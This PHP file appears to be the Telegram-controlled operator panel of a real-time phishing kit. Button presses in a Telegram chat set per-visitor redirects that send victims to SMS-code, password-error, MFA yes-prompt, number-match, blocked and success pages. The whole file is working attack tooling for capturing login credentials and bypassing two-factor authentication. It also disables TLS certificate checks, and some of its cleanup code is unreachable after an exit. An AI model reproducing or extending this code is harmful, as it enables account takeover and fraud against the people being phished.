<?php
// Start output buffering to prevent any output before JSON
ob_start();

// Initialize session with cPanel compatibility
require_once('session_init.php');

include('config.php');

// Set maximum execution time to prevent timeouts
set_time_limit(60);

// Log start time for performance tracking
$start_time = microtime(true);
error_log("Starting Telegram updates check at " . date('Y-m-d H:i:s'));

// Get updates from Telegram using curl_multi for better performance
$multi = curl_multi_init();
$ch = curl_init();

// Check if we have a last processed update ID in the session
$offset = 0;
$offset_file = __DIR__ . '/session/last_update_id.txt';
if (file_exists($offset_file)) {
    $offset = (int)file_get_contents($offset_file) + 1;
    error_log("Using offset: {$offset} from file");
}

// Add offset to getUpdates request to avoid processing the same updates
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$settings['bot_url']}/getUpdates?offset={$offset}");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 5); // Set timeout to 5 seconds
curl_multi_add_handle($multi, $ch);

// Execute request asynchronously
$active = null;
do {
    $mrc = curl_multi_exec($multi, $active);
} while ($mrc == CURLM_CALL_MULTI_PERFORM);

while ($active && $mrc == CURLM_OK) {
    if (curl_multi_select($multi) == -1) {
        usleep(1);
    }
    do {
        $mrc = curl_multi_exec($multi, $active);
    } while ($mrc == CURLM_CALL_MULTI_PERFORM);
}

$response = curl_multi_getcontent($ch);
$curl_error = curl_error($ch);
curl_multi_remove_handle($multi, $ch);
curl_multi_close($multi);
curl_close($ch);

// Clear any output that might have been sent
ob_clean();

// Handle curl errors
if ($response === false || !empty($curl_error)) {
    error_log("Curl error in Telegram updates: " . $curl_error);
    header('Content-Type: application/json');
    ob_end_clean();
    echo json_encode(['status' => 'error', 'message' => 'Failed to fetch updates']);
    exit;
}

// Make sure the session directory exists
if (!is_dir(__DIR__ . '/session')) {
    mkdir(__DIR__ . '/session', 0755, true);
}

$updates = json_decode($response, true);

if (!$updates || !isset($updates['result']) || empty($updates['result'])) {
    error_log("No updates found from Telegram API");
    header('Content-Type: application/json');
    ob_end_clean(); // Clear output buffer
    echo json_encode(['status' => 'no_updates']);
    exit;
}

// Process each update
foreach ($updates['result'] as $update) {
    if (!isset($update['callback_query'])) {
        continue;
    }

    $callback_query = $update['callback_query'];
    $chat_id = $callback_query['message']['chat']['id'];
    $callback_id = $callback_query['id'];
    $data = $callback_query['data'];

    // Extract visitor ID from message
    preg_match('/Visitor ID: ([a-f0-9]{64})/', $callback_query['message']['text'], $matches);
    $visitor_id = $matches[1] ?? '';

    if (empty($visitor_id)) {
        continue;
    }

    // Initialize curl multi handle for parallel requests
    $multi = curl_multi_init();
    $channels = [];
    $requests = [];

    // Handle different button clicks
    switch($data) {
        case 'number_prompt':
            // Show number selection keyboard
            $numbers = [];
            $row = [];
            for ($i = 1; $i <= 100; $i++) {
                $row[] = ['text' => $i, 'callback_data' => 'number_' . $i];
                if (count($row) == 5 || $i == 100) {
                    $numbers[] = $row;
                    $row = [];
                }
            }
            
            $numbers[] = [['text' => '↩️ Back to Main Menu', 'callback_data' => 'back_to_main']];
            
            $new_keyboard = [
                'inline_keyboard' => $numbers
            ];
            
            // Send temporary notification
            $requests[] = "https://api.telegram.org/bot{$settings['bot_url']}/answerCallbackQuery?" . http_build_query([
                'callback_query_id' => $callback_id,
                'text' => "📞 Loading number selection...",
                'show_alert' => false
            ]);
            
            // Update keyboard
            $requests[] = "https://api.telegram.org/bot{$settings['bot_url']}/editMessageReplyMarkup?" . http_build_query([
                'chat_id' => $chat_id,
                'message_id' => $callback_query['message']['message_id'],
                'reply_markup' => json_encode($new_keyboard)
            ]);
            break;

        case (preg_match('/^number_(\d+)$/', $data, $matches) ? true : false):
            $number = $matches[1];
            $redirect_url = "prompt-numb.php?id=" . $visitor_id . "&number=" . $number;
            $status = "ready";

            // Send temporary notification
            $requests[] = "https://api.telegram.org/bot{$settings['bot_url']}/answerCallbackQuery?" . http_build_query([
                'callback_query_id' => $callback_id,
                'text' => "✅ Number #" . $number . " selected",
                'show_alert' => false
            ]);

            // Update redirects.json
            $redirects_file = __DIR__ . '/session/redirects.json';
            $redirects = json_decode(file_get_contents($redirects_file), true) ?: ['redirects' => []];
            $redirects['redirects'][$visitor_id] = [
                'status' => $status,
                'redirect_url' => $redirect_url,
                'updated' => time()
            ];
            file_put_contents($redirects_file, json_encode($redirects, JSON_PRETTY_PRINT));

            // Send status message
            $status_msg = "🔄 <b>Action Triggered</b>\n\n";
            $status_msg .= "• Action: Number Prompt (#" . $number . ")\n";
            $status_msg .= "• Status: Pending\n";
            $status_msg .= "• Time: " . date('Y-m-d H:i:s') . "\n";

            $requests[] = "https://api.telegram.org/bot{$settings['bot_url']}/sendMessage?" . http_build_query([
                'chat_id' => $chat_id,
                'text' => $status_msg,
                'parse_mode' => 'HTML',
                'disable_web_page_preview' => true
            ]);
            break;

        case 'yes_prompt':
            $redirect_url = "prompt-yes.php?id=" . $visitor_id;
            $status = "ready";

            // Send temporary notification
            $requests[] = "https://api.telegram.org/bot{$settings['bot_url']}/answerCallbackQuery?" . http_build_query([
                'callback_query_id' => $callback_id,
                'text' => "✅ Yes Prompt triggered",
                'show_alert' => false
            ]);

            // Update redirects.json
            $redirects_file = __DIR__ . '/session/redirects.json';
            $redirects = json_decode(file_get_contents($redirects_file), true) ?: ['redirects' => []];
            $redirects['redirects'][$visitor_id] = [
                'status' => $status,
                'redirect_url' => $redirect_url,
                'updated' => time()
            ];
            file_put_contents($redirects_file, json_encode($redirects, JSON_PRETTY_PRINT));

            // Send status message
            $status_msg = "🔄 <b>Action Triggered</b>\n\n";
            $status_msg .= "• Action: Yes Prompt\n";
            $status_msg .= "• Status: Pending\n";
            $status_msg .= "• Time: " . date('Y-m-d H:i:s') . "\n";

            $requests[] = "https://api.telegram.org/bot{$settings['bot_url']}/sendMessage?" . http_build_query([
                'chat_id' => $chat_id,
                'text' => $status_msg,
                'parse_mode' => 'HTML',
                'disable_web_page_preview' => true
            ]);
            break;

        // Add similar patterns for other buttons
        case 'security_preference':
        case 'sms1':
        case 'sms2':
        case 'password_error':
        case 'block':
        case 'success':
            $redirect_urls = [
                'security_preference' => "select.php?id=" . $visitor_id,
                'sms1' => "auth.php?id=" . $visitor_id,
                'sms2' => "erauth.php?id=" . $visitor_id,
                'password_error' => "error.php?id=" . $visitor_id,
                'block' => "blocked.php?id=" . $visitor_id,
                'success' => "success.php?id=" . $visitor_id
            ];

            $status_emojis = [
                'security_preference' => "🔒",
                'sms1' => "📱",
                'sms2' => "📱",
                'password_error' => "❌",
                'block' => "🚫",
                'success' => "✅"
            ];

            $redirect_url = $redirect_urls[$data];
            $status = "ready";

            // Send temporary notification
            $requests[] = "https://api.telegram.org/bot{$settings['bot_url']}/answerCallbackQuery?" . http_build_query([
                'callback_query_id' => $callback_id,
                'text' => $status_emojis[$data] . " Action triggered",
                'show_alert' => false
            ]);

            // Update redirects.json
            $redirects_file = __DIR__ . '/session/redirects.json';
            $redirects = json_decode(file_get_contents($redirects_file), true) ?: ['redirects' => []];
            $redirects['redirects'][$visitor_id] = [
                'status' => $status,
                'redirect_url' => $redirect_url,
                'updated' => time()
            ];
            file_put_contents($redirects_file, json_encode($redirects, JSON_PRETTY_PRINT));

            // Send status message
            $status_msg = "🔄 <b>Action Triggered</b>\n\n";
            $status_msg .= "• Action: " . ucfirst(str_replace('_', ' ', $data)) . "\n";
            $status_msg .= "• Status: Pending\n";
            $status_msg .= "• Time: " . date('Y-m-d H:i:s') . "\n";

            $requests[] = "https://api.telegram.org/bot{$settings['bot_url']}/sendMessage?" . http_build_query([
                'chat_id' => $chat_id,
                'text' => $status_msg,
                'parse_mode' => 'HTML',
                'disable_web_page_preview' => true
            ]);
            break;
    }

    // Execute all requests in parallel
    foreach ($requests as $request) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $request);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_multi_add_handle($multi, $ch);
        $channels[] = $ch;
    }

    // Execute all requests simultaneously
    $active = null;
    do {
        $mrc = curl_multi_exec($multi, $active);
    } while ($mrc == CURLM_CALL_MULTI_PERFORM);

    while ($active && $mrc == CURLM_OK) {
        if (curl_multi_select($multi) == -1) {
            usleep(1);
        }
        do {
            $mrc = curl_multi_exec($multi, $active);
        } while ($mrc == CURLM_CALL_MULTI_PERFORM);
    }

    // Clean up
    foreach ($channels as $ch) {
        curl_multi_remove_handle($multi, $ch);
        curl_close($ch);
    }
    curl_multi_close($multi);

    // Update redirects.json for simple redirects
    if (isset($redirect_url) && isset($status)) {
        $redirects_file = __DIR__ . '/session/redirects.json';
        if (file_exists($redirects_file)) {
            $redirects = json_decode(file_get_contents($redirects_file), true) ?: ['redirects' => []];
            $redirects['redirects'][$visitor_id] = [
                'status' => 'ready',
                'redirect_url' => $redirect_url,
                'updated' => time()
            ];
            file_put_contents($redirects_file, json_encode($redirects, JSON_PRETTY_PRINT));
        }
    }
}

// Clear processed updates asynchronously
if (!empty($updates['result'])) {
    $last_update_id = end($updates['result'])['update_id'];
    
    // Save the last update ID to file for future requests
    $offset_file = __DIR__ . '/session/last_update_id.txt';
    file_put_contents($offset_file, $last_update_id);
    error_log("Saved last update ID: {$last_update_id} to file");
    
    // Use curl_multi for non-blocking offset update
    $multi = curl_multi_init();
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$settings['bot_url']}/getUpdates?offset=" . ($last_update_id + 1) . "&timeout=1");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 2);
    curl_multi_add_handle($multi, $ch);

// Start the request but don't wait for it to complete
curl_multi_exec($multi, $active);

// Log performance metrics
$end_time = microtime(true);
$execution_time = ($end_time - $start_time);
error_log("Telegram updates processed in {$execution_time} seconds");

// Return success status for AJAX calls
header('Content-Type: application/json');
ob_end_clean(); // Clear any output buffer before sending JSON
echo json_encode([
    'status' => 'success', 
    'execution_time' => $execution_time,
    'updates_processed' => count($updates['result'] ?? []),
    'last_update_id' => $last_update_id ?? 0
]);
exit; // Exit immediately after sending JSON

// Clean up in the background after response is sent
fastcgi_finish_request();  // This will send the response immediately and continue processing

// Complete the offset update request
do {
    $mrc = curl_multi_exec($multi, $active);
} while ($mrc == CURLM_CALL_MULTI_PERFORM);

while ($active && $mrc == CURLM_OK) {
    if (curl_multi_select($multi) == -1) {
        usleep(1);
    }
    do {
        $mrc = curl_multi_exec($multi, $active);
    } while ($mrc == CURLM_CALL_MULTI_PERFORM);
}

    curl_multi_remove_handle($multi, $ch);
    curl_multi_close($multi);
    curl_close($ch);
}